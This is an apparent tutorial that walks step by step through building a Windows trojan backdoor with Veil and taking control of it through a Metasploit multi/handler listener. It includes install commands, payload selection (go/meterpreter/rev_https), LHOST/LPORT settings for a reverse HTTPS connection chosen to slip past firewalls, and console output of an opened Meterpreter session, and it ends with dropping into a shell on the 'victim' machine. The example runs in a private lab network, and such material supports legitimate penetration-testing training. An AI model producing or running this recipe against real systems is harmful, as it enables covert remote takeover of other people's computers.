# veil - Creating backdoors with veil and metasploit

## Introduction

Note that backdoors created with `veil` are recognised by all antivirus software.

## Creating the backdoor

First install veil, but really this way, as the installation of veil will 
install tons of other stuff which will popup wizards etc and you will fail 
at some point anyway:

    apt update
    apt install -y veil
    /usr/share/veil/config/setup.sh --force --silent

Start veil as root user.

Use the Evasion tool:

    use 1

List the available payloads:

    list

This shows a list (41 items) of different payloads. In this case we want to 
create a reverse https connection. So that the infected machine will start 
the connection itself and which will then probably not blocked by the 
firewall or router. As the victim will probably have a local ip address.

The other important point, as we will use metasploit, we need to find a 
payload containing the word `meterpreter`, as they are the same authors as 
metasploit. For example payload 15.

    15)     go/meterpreter/rev_https.py

Select the desired payload:

    use 15

Show the options we should set:

    show options

Set the desired options:

    set LHOST 10.0.2.4
    set LPORT 8080

Finally, generate the backdoor:

    generate

Give a name to the output file:

    go_rev_https_8080

You get some information to where the output is generated. Which is:

    /var/lib/veil/output/compiled/

## Using the backdoor

Start the metasploit console with:

    msfconsole

Nos use a multi handler listener:

    use exploit/multi/handler

We need to select the same payload as we used to create the Trojan backdoor. 
But we can list all available payloads with `show payloads`. Which will 
return a list of `549` entries.

Set the payload:

    set PAYLOAD windows/meterpreter/reverse_https

See the available options we can/need to set

    show options

Set the required options

    set LHOST 10.0.2.4
    set LPORT 8080

Verify the options now and if needed, adjust them like we did before:

    show options

Now it's time to launch the exploit:

    exploit

You will see that the interpreter looks like this now:

    msf6 exploit(multi/handler) > exploit
    
    [*] Started HTTPS reverse handler on https://10.0.2.4:8080

It is now waiting that the victim runs the backdoor Trojan.

So on a Windows machine launch one of the created reverse HTTPS backdoor.

Once this happens, you will see that you are connected.

    [!] https://10.0.2.4:8080 handling request from 10.0.2.5; (UUID: n9stxefm) Without a database connected that payload UUID tracking will not work!
    [*] https://10.0.2.4:8080 handling request from 10.0.2.5; (UUID: n9stxefm) Staging x86 payload (176220 bytes) ...
    [!] https://10.0.2.4:8080 handling request from 10.0.2.5; (UUID: n9stxefm) Without a database connected that payload UUID tracking will not work!
    [*] Meterpreter session 1 opened (10.0.2.4:8080 -> 127.0.0.1) at 2021-07-24 17:45:32 +0200
    
    meterpreter >

You can get system information with:

    sysinfo

And you can run other metasploit shell commands  But at this point 
your still not really on the Windows shell. 

To get the Windows shell, type

    shell

Now you have full access on the victims computer through the Windows shell
